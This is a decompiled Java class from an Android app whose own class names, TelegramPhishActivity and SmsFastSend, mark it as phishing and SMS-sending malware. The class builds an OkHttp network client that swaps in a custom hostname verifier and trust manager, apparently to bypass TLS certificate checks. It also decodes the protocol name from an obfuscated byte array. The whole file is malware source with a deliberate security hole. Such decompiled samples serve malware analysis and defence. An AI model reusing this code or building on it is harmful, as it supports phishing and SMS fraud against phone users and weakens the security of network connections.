package com.base.template.network;

import com.base.template.TelegramPhishActivity$$ExternalSyntheticLambda0;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.concurrent.TimeUnit;
import javax.net.ssl.SSLContext;
import kotlin.jvm.functions.Function0;
import kotlin.jvm.internal.Lambda;
import okhttp3.OkHttpClient;
import okhttp3.internal.Util;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class SmsFastSend$client$2 extends Lambda implements Function0 {
    public static final SmsFastSend$client$2 INSTANCE = new SmsFastSend$client$2(0);

    @Override // kotlin.jvm.functions.Function0
    public final Object invoke() throws NoSuchAlgorithmException, KeyManagementException {
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        builder.connectTimeout = Util.checkDuration(5L, timeUnit);
        builder.writeTimeout = Util.checkDuration(5L, timeUnit);
        builder.readTimeout = Util.checkDuration(5L, timeUnit);
        TelegramPhishActivity$$ExternalSyntheticLambda0 telegramPhishActivity$$ExternalSyntheticLambda0 = new TelegramPhishActivity$$ExternalSyntheticLambda0(1);
        if (!telegramPhishActivity$$ExternalSyntheticLambda0.equals(builder.hostnameVerifier)) {
            builder.routeDatabase = null;
        }
        builder.hostnameVerifier = telegramPhishActivity$$ExternalSyntheticLambda0;
        SSLContext sSLContext = SSLContext.getInstance(C0000.decode(new byte[]{97, 120, 100}, "54740e97", false));
        SmsFastSend$trustManager$1 smsFastSend$trustManager$1 = SmsFastSend.trustManager;
        sSLContext.init(null, new SmsFastSend$trustManager$1[]{smsFastSend$trustManager$1}, null);
        builder.sslSocketFactory(sSLContext.getSocketFactory(), smsFastSend$trustManager$1);
        return new OkHttpClient(builder);
    }
}
